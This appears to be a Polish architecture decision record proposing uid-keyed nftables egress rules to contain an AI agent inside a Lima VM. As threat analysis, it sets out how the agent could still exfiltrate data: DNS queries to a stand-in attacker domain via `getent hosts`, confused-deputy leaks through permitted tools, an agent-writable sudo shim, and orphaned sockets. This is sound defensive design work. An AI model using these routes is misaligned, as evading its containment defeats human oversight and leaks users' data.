<!--
AI-Provenance:
  model: Claude Opus 5 (1M context)
  harness: Claude Code
-->

# ADR-0024: Kontrola egressu gościa po uid

- Status: Proposed
- Date: 2026-07-29
- Dotyczy: `internal/lima`, `internal/cli`, ruleset nftables gościa
- Powiązane: [ADR-0022](0022-mcp-credential-broker.md) (zostawia wyniesienie
  danych otwarte), [ADR-0023](0023-inference-credential-custody.md) (jawnie
  opiera się na tej decyzji), [ADR-0003](0003-lima-trust-boundary.md),
  [ADR-0016](0016-normative-documents-are-corrected-not-archived.md)

## Context

ADR-0022 przeniósł tokeny MCP spod tożsamości agenta, ADR-0023 robi to samo z
credentialem inferencji. Oba zostawiają tę samą dziurę: agent **legalnie**
otrzymuje treść przez dozwolone narzędzia i może ją wysłać dowolnie, bo ma
nieograniczone wyjście na zewnątrz. ADR-0023 jest ponadto niepełny bez tej
decyzji — jego broker słucha na loopback TCP, gdzie tożsamości rozmówcy nie
ustala nikt, a jedyne domknięcie to reguła kluczowana po uid.

`docs/03-architecture.md` wymienia dziś „domenowy egress allowlist" wśród rzeczy
świadomie poza zakresem. **Ta decyzja to odwraca** i mówi o tym wprost, zamiast
udawać, że luki nigdy nie było.

### Co zostało zweryfikowane na żywej instancji

**Reguła netfiltera kluczowana po uid jest realną granicą wobec `hermes`.**
`meta skuid` działa na tym kernelu (6.8.0-134, `nf_tables` rezydentny,
`nft --check` przechodzi z rozwiązywaniem nazwy `"hermes"` na uid), a `--check`
jest przejściem do kernela, nie parsowaniem — bez roota kończy się `Operation
not permitted` na netlinku, a odrzucenia po stronie kernela wychodzą z niego
dosłownie. `hermes` nie ma sudo, nie ma żadnej capability, `unshare --net` mu
odmawia, userns jest ograniczony przez AppArmor, i nie posiada żadnego pliku na
uprzywilejowanej ścieżce wykonania. **Nie ma prymitywu, którym mógłby ten
ruleset przeczytać, zmienić ani ominąć.**

**Po stronie hosta nie ma gdzie tego egzekwować.** Podsieć gościa
`192.168.5.0/24` nie istnieje na żadnym interfejsie macOS; stos TCP/IP gościa
kończy się **wewnątrz procesu `limactl hostagent`**, działającego jako uid
operatora, który potem otwiera zwykłe gniazda na `en0`. Reguła pf `user 501`
objęłaby więc cały własny ruch operatora — przeglądarkę, gita, wszystko. Nic po
stronie hosta nie odróżnia ruchu gościa od ruchu operatora. **Egzekwowanie jest
w gościu albo nigdzie.**

## Decision

**Domyślnie DROP na `output` w gościu, z jawnymi przepustkami kluczowanymi po
uid, we własnej tabeli nftables Torio.**

1. **Default-deny, nie default-accept z regułami drop.** To nie jest kwestia
   stylu. `meta skuid` czyta uid z gniazda i **nie dopasowuje pakietów gniazd
   osieroconych** — zamkniętych z danymi w buforze, TIME_WAIT, retransmisji.
   Polityka „accept, a `hermes` drop" jest więc omijalna sekwencją
   połącz-wyślij-zamknij. Przy `policy drop` pakiet nieprzypisywalny nie pasuje
   do niczego i ginie. Semantyka gniazd osieroconych jest **niezweryfikowana na
   tym hoście** (wynika z kodu upstreamu) — ale kształt fail-closed nic nie
   kosztuje, a alternatywa jest nieuzasadniona.

2. **Własna tabela, nigdy `nft flush ruleset`.** Lima instaluje w gościu własne
   `table ip nat` z hookami `LIMADNS`; globalny flush skasowałby jej DNS.

3. **Rodzina `inet`, albo jawny drop dla v6.** Gość ma dziś tylko adres
   link-local, więc ruleset napisany wyłącznie dla `ip` przepuściłby po cichu
   cały v6 w dniu, w którym Lima albo Mac dostaną uplink v6.

4. **Przepustki są per-uid i wyliczalne.** `hermes` (agent), `torio-mcp`
   (broker MCP), `torio-infer` (ADR-0023), `_apt`, `systemd-resolve`,
   `systemd-timesync`, timery roota, operator. Operator zachowuje normalną sieć —
   inaczej `git push` z `torio project shell` przestaje działać. Reguły po uid
   wyrażają dokładnie ten invariant, który `cli.md` próbuje opisać słowami: ta
   sama VM, dwie różne zdolności, tym razem egzekwowane.

5. **Weryfikacja czyta treść rulesetu, nie jego obecność.** Załadowana, ale
   opróżniona tabela przechodzi każdy test pliku i nie egzekwuje niczego — ten
   sam argument, którym ADR-0022 odrzuca obecny-lecz-martwy socket. Kontrola musi
   udowodnić politykę łańcucha i zestaw reguł, oraz że unit jest **enabled i
   active** (`nftables.service` jest dziś `disabled/inactive`).

## Precondition, bez którego ta decyzja nic nie znaczy

`/usr/local/bin/hermes` jest **root-owym symlinkiem na plik zapisywalny przez
`hermes`** (`-rwxrwxr-x hermes hermes`), a `/usr/local/bin` jest pierwsze na
`secure_path` sudo, na maszynie, gdzie operator ma sudo bez hasła.

Torio samo nigdy nie uruchamia tego shimu jako root. Ale **jedno `sudo hermes …`
napisane przez operatora wykonuje kod autorstwa agenta jako root** i kasuje
dowolny ruleset jedną komendą.

**Granica egzekwowana przez kernel, którą operator może usunąć jednym poleceniem
po socjotechnice, nie jest granicą.** To musi zostać naprawione przed tą pracą
albo razem z nią: shim powinien być plikiem należącym do roota (kopia albo
wrapper robiący `exec` pod `setpriv --reuid hermes`), a `bootstrap` powinien
dowodzić, że ostateczny cel shimu **nie** jest zapisywalny przez `hermes`. Jest
to dziś jedyna w całym gościu jednokrokowa ścieżka od uid agenta do roota.

## Czego ta decyzja NIE zamyka

**DNS jest kanałem wyniesienia i kluczowanie po uid go nie dotyka.** Każde
zapytanie wychodzi z gościa jako `systemd-resolved`, uid 991 — **nigdy** jako
uid agenta. Przepustka na DNS oddaje więc `hermes` dwukierunkowy kanał: dane w
etykietach zapytania, odpowiedzi w TXT/CNAME, bez żadnego specjalnego narzędzia —
`getent hosts <payload>.attacker.tld` wystarcza. Przypięcie serwera DNS **nie
pomaga**, bo wyciek jest w nazwie, nie w adresacie. Do rozstrzygnięcia osobno:
resolwer odrzucający nazwy spoza allowlisty, statyczny `/etc/hosts`, albo jawne
przyjęcie tego kanału do wiadomości. **Zdanie „wyniesienie danych zostaje
nierozwiązane" z ADR-0022 pozostaje prawdziwe także po tej decyzji.**

**Każdy dopuszczony uid jest confused deputy, a ADR-0022 tworzy jednego
celowo.** Broker MCP musi sięgać do swojego upstreamu, więc cokolwiek agent
przepchnie przez przyznane narzędzie **zapisujące** — komentarz w Jirze, strona
w Confluence — opuszcza pudełko czysto, pod dozwolonym uid, wyglądając na ruch
legalny. Kontrola po uid **przenosi** ten kanał, a nie go zamyka.

Uczciwe podsumowanie wartości: podnosi koszt masowego i przypadkowego wyniesienia
i czyni zbiór dozwolonych celów wyliczalnym. **Nie powstrzyma zdeterminowanego
agenta**, bo co najmniej trzy dopuszczone uid-y są z uid 1000 osiągalne.

**Allowlisty nie da się wyprowadzić w całości mechanicznie.** Z
`projects[].remote` zawsze da się wyciągnąć token hosta — walidacja registry to
gwarantuje strukturalnie — ale ten token może być **aliasem z konfiguracji SSH**,
a nie nazwą DNS. Dwa jawne wyjścia: zawęzić registry, odrzucając hosty bez
kropki (łamiąc kompatybilność), albo rozwijać aliasy przy generowaniu reguł i
zapisywać rozwinięcie. Milczące potraktowanie aliasu jak nazwy DNS jest trybem
awarii: reguła powstaje, nie pasuje do niczego, a połączenie ginie z mylącym
błędem.

**Najbardziej nośny cel nie jest nigdzie zapisany maszynowo.** `model.base_url`
jest puste, więc endpoint inferencji da się dziś ustalić wyłącznie grepowaniem
źródeł Hermesa. Allowlista, która o nim zapomni, położy agenta całkowicie.

## Consequences

- **Sprzężenie z historią obrazu.** `vm bootstrap` pobiera dziś `install.sh` z
  `hermes-agent.nousresearch.com` i wykonuje `apt-get` wobec `ports.ubuntu.com`
  **po zwykłym HTTP**. Albo te hosty zostają na allowliście na stałe — czyli
  mirror apt jako trwała powierzchnia supply-chain — albo przenoszą się do
  zapieczonego obrazu. To jest realne ograniczenie kolejności prac.
- Zbiór dozwolonych celów staje się artefaktem, który ktoś utrzymuje. Nowy
  provider, nowy MCP czy nowy projekt wymagają jawnej zmiany — i to jest cecha,
  nie koszt, dopóki komunikat o odmowie mówi wprost, czego brakuje.
- Ubuntu w tle chce wyjścia dla `unattended-upgrades`, `systemd-timesyncd`,
  `motd-news` i `ua-timer`. Każdy z nich to decyzja: dopuścić albo wyłączyć.
  Cicha odmowa zamieni je w powtarzające się błędy w logach.
- Pakiet instalujący w przyszłości binarkę setuid-root albo z `cap_net_raw`
  wybije dziurę bez ostrzeżenia, bo jej gniazda niosłyby `skuid 0`. `bootstrap`
  powinien dowodzić inwentarza setuid/getcap tak, jak dowodzi trybów plików.

## Rejected

- **Egzekwowanie po stronie hosta (pf).** Podsieci gościa nie ma na żadnym
  interfejsie macOS, a ruch gościa wychodzi z procesu działającego jako operator —
  reguła `user 501` objęłaby cały jego własny ruch. Do tego dopasowywanie po
  użytkowniku w pf na współczesnym macOS jest niezweryfikowane. Wsparta ścieżka
  Apple'a to filtr Network Extension per-proces, którego w tym repo nie ma.
- **Polityka `accept` z regułami `drop` dla wybranych uid.** Omijalna przez
  gniazda osierocone (patrz Decision 1).
- **Globalny `nft flush ruleset` przed instalacją własnych reguł.** Kasuje hooki
  DNS Limy i psuje rozwiązywanie nazw w całym gościu.
- **Allowlista po adresach IP.** CDN-y rotują adresy; reguła psuje się po cichu i
  w najgorszym momencie. Filtrowanie po nazwie musi się odbywać tam, gdzie nazwa
  jest widoczna — czyli na proxy po SNI/CONNECT, do którego kernel wymusza ruch.
- **Przechwytywanie TLS w gościu (MITM CA).** Pozwoliłoby filtrować treść kosztem
  wstawienia własnego CA do zaufanych. Lekarstwo gorsze od choroby.
- **Zaniechanie, bo rozwiązanie jest niepełne.** DNS i confused deputy zostają
  otwarte, a mimo to wyliczalny, egzekwowany zbiór dozwolonych celów jest wart
  swojej ceny — pod warunkiem, że nigdzie nie zostanie opisany jako szczelny.

## Niezweryfikowane

Zapisane, żeby nikt nie wziął ich za ustalone: zachowanie `meta skuid` wobec
gniazd osieroconych na tym hoście; czy pf jest na tym Macu w ogóle włączone; czy
Lima 2.2.0 wystawia jakikolwiek własny knob na ograniczenie egressu usernetu;
faktyczny host endpointu inferencji; hosty PyPI/npm/uv-python, wywnioskowane z
artefaktów w drzewie, a nie odczytane z konfiguracji ani zaobserwowane na łączu.
